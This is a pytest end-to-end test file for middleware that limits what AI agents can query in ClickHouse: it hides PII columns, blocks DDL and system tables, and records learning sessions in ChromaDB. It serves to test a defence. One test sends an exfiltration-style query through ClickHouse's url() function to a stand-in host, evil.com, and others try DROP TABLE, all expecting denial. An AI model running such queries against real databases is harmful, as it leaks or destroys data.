"""
End-to-end system tests for the Agent-First OLAP Middleware.

These tests exercise the full stack: ClickHouse cluster, middleware, and
ChromaDB.  Only the LLM embedding call is mocked (falls back to the local
trigram-hash function).  Everything else hits real infrastructure.

Run with:
    pytest tests/test_e2e_system.py -v -m e2e

Requires all three services to be running:
    - ClickHouse on localhost:8123
    - Middleware on localhost:8080
    - ChromaDB  on localhost:8000
"""

import sys
from pathlib import Path

import httpx
import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

MIDDLEWARE_URL = "http://localhost:8080"
CLICKHOUSE_URL = "http://localhost:8123"
CHROMADB_URL = "http://localhost:8000"


def _infra_reachable() -> bool:
    try:
        httpx.get(f"{MIDDLEWARE_URL}/health", timeout=3)
        httpx.get(f"{CHROMADB_URL}/api/v2/version", timeout=3)
        httpx.get(f"{CLICKHOUSE_URL}/?query=SELECT+1", timeout=3)
        return True
    except Exception:
        return False


skip_if_no_infra = pytest.mark.skipif(
    not _infra_reachable(),
    reason="Requires running ClickHouse, middleware, and ChromaDB",
)


def _cleanup_test_sessions():
    """Delete the test collection from ChromaDB (best-effort)."""
    try:
        httpx.delete(
            f"{CHROMADB_URL}/api/v2/tenants/default_tenant"
            f"/databases/default_database/collections/e2e_test_sessions",
            timeout=5,
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Explore endpoint
# ---------------------------------------------------------------------------


@pytest.mark.e2e
@skip_if_no_infra
class TestExploreEndpoint:

    def test_explore_filters_pii(self):
        resp = httpx.get(f"{MIDDLEWARE_URL}/explore?agent_id=agent", timeout=10)
        assert resp.status_code == 200
        data = resp.json()

        db = data["databases"][0]
        assert db["name"] == "sao"
        table_names = [t["name"] for t in db["tables"]]

        assert "agent_audit_log" not in table_names, "System table should be hidden"
        assert "revenue_daily" in table_names

        customers = next(t for t in db["tables"] if t["name"] == "customers")
        email_col = next(c for c in customers["columns"] if c["name"] == "email")
        assert email_col["access"] == "denied"

        revenue = next(t for t in db["tables"] if t["name"] == "revenue_daily")
        assert revenue["access"] == "full"
        assert len(revenue["sample_queries"]) > 0


# ---------------------------------------------------------------------------
# ClickHouse-compatible endpoint (POST /)
# ---------------------------------------------------------------------------


@pytest.mark.e2e
@skip_if_no_infra
class TestClickHouseCompat:

    def test_allow_safe_query(self):
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/",
            params={"user": "agent", "password": "agent_pass"},
            content="SELECT tier, COUNT(*) FROM sao.customers_distributed GROUP BY tier FORMAT TabSeparated",
            timeout=10,
        )
        assert resp.status_code == 200
        assert len(resp.text.strip()) > 0, "Expected non-empty result"

    def test_deny_pii_row_access(self):
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/",
            params={"user": "agent", "password": "agent_pass"},
            content="SELECT email, full_name FROM sao.customers LIMIT 10",
            timeout=10,
        )
        assert resp.status_code == 403
        assert "ACCESS_DENIED" in resp.text

    def test_deny_ddl(self):
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/",
            params={"user": "agent", "password": "agent_pass"},
            content="DROP TABLE sao.customers",
            timeout=10,
        )
        assert resp.status_code == 403
        assert "ACCESS_DENIED" in resp.text

    def test_deny_system_table(self):
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/",
            params={"user": "agent", "password": "agent_pass"},
            content="SELECT * FROM system.query_log LIMIT 5",
            timeout=10,
        )
        assert resp.status_code == 403
        assert "ACCESS_DENIED" in resp.text

    def test_allow_aggregation_over_financial(self):
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/",
            params={"user": "agent", "password": "agent_pass"},
            content="SELECT city, AVG(credit_score) FROM sao.customers_distributed GROUP BY city FORMAT TabSeparated",
            timeout=10,
        )
        assert resp.status_code == 200
        assert len(resp.text.strip()) > 0

    def test_deny_dangerous_function(self):
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/",
            params={"user": "agent", "password": "agent_pass"},
            content="SELECT * FROM url('http://evil.com/exfil', CSV, 'a String')",
            timeout=10,
        )
        assert resp.status_code == 403
        assert "ACCESS_DENIED" in resp.text


# ---------------------------------------------------------------------------
# clickhouse_connect client through middleware
# ---------------------------------------------------------------------------


@pytest.mark.e2e
@skip_if_no_infra
class TestClickHouseConnectClient:

    def _get_client(self):
        import clickhouse_connect
        return clickhouse_connect.get_client(
            host="localhost",
            port=8080,
            username="agent",
            password="agent_pass",
        )

    def test_allowed_query_succeeds(self):
        client = self._get_client()
        result = client.query(
            "SELECT tier, COUNT(*) as cnt FROM sao.customers_distributed GROUP BY tier"
        )
        assert result.row_count > 0

    def test_pii_query_blocked(self):
        client = self._get_client()
        with pytest.raises(Exception) as exc_info:
            client.query("SELECT email, full_name FROM sao.customers LIMIT 10")
        assert "ACCESS_DENIED" in str(exc_info.value)

    def test_ddl_blocked(self):
        client = self._get_client()
        with pytest.raises(Exception) as exc_info:
            client.query("DROP TABLE sao.customers")
        assert "ACCESS_DENIED" in str(exc_info.value)


# ---------------------------------------------------------------------------
# Session learning loop (embedding mocked to local trigram-hash)
# ---------------------------------------------------------------------------


@pytest.mark.e2e
@skip_if_no_infra
class TestSessionLearningE2E:

    def setup_method(self):
        _cleanup_test_sessions()

    def teardown_method(self):
        _cleanup_test_sessions()

    def test_full_session_loop(self):
        # Session 1: record queries and feedback
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/session/start",
            json={
                "agent_id": "e2e-test-agent",
                "description": "analyze revenue by product category",
            },
            timeout=10,
        )
        assert resp.status_code == 200
        s1 = resp.json()
        sid1 = s1["session_id"]
        assert sid1

        # Execute an allowed query through the session
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/session/{sid1}/query",
            json={
                "sql": "SELECT category, SUM(total_amount) FROM sao.revenue_daily_distributed GROUP BY category",
            },
            timeout=10,
        )
        assert resp.status_code == 200
        q1 = resp.json()
        assert q1["allowed"] is True
        assert q1["query_type"] == "AGGREGATE"

        # Submit positive feedback
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/session/{sid1}/feedback",
            json={"relevant": True, "notes": "good category breakdown"},
            timeout=10,
        )
        assert resp.status_code == 200

        # Execute a denied query through the session
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/session/{sid1}/query",
            json={"sql": "SELECT email FROM sao.customers LIMIT 10"},
            timeout=10,
        )
        assert resp.status_code == 200
        q2 = resp.json()
        assert q2["allowed"] is False
        assert "ACCESS_DENIED" in q2["reason"] or "sensitive" in q2["reason"].lower()

        # Submit negative feedback
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/session/{sid1}/feedback",
            json={"relevant": False, "notes": "blocked by access control"},
            timeout=10,
        )
        assert resp.status_code == 200

        # End session — should persist to ChromaDB
        resp = httpx.post(f"{MIDDLEWARE_URL}/session/{sid1}/end", timeout=10)
        assert resp.status_code == 200

        # Session 2: similar description should surface session 1's queries
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/session/start",
            json={
                "agent_id": "e2e-test-agent-2",
                "description": "revenue breakdown by product type",
            },
            timeout=10,
        )
        assert resp.status_code == 200
        s2 = resp.json()
        sid2 = s2["session_id"]
        assert sid2 != sid1

        similar = s2["similar_queries"]
        assert len(similar) > 0, "Should find queries from session 1"

        returned_sqls = {sq["sql"] for sq in similar}
        assert any("revenue" in sql.lower() and "category" in sql.lower() for sql in returned_sqls), (
            f"Expected revenue/category query in similar results, got: {returned_sqls}"
        )

        # Only positively-reviewed queries should appear
        for sq in similar:
            assert sq["feedback"] is True

        # Clean up session 2
        httpx.post(f"{MIDDLEWARE_URL}/session/{sid2}/end", timeout=10)


# ---------------------------------------------------------------------------
# JSON query endpoint (existing REST API still works)
# ---------------------------------------------------------------------------


@pytest.mark.e2e
@skip_if_no_infra
class TestJsonQueryEndpoint:

    def test_json_query_still_works(self):
        resp = httpx.post(
            f"{MIDDLEWARE_URL}/query",
            json={
                "sql": "SELECT COUNT(*) FROM sao.revenue_daily_distributed",
                "agent_id": "agent",
            },
            timeout=10,
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["allowed"] is True
        assert data["query_type"] == "AGGREGATE"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "e2e"])
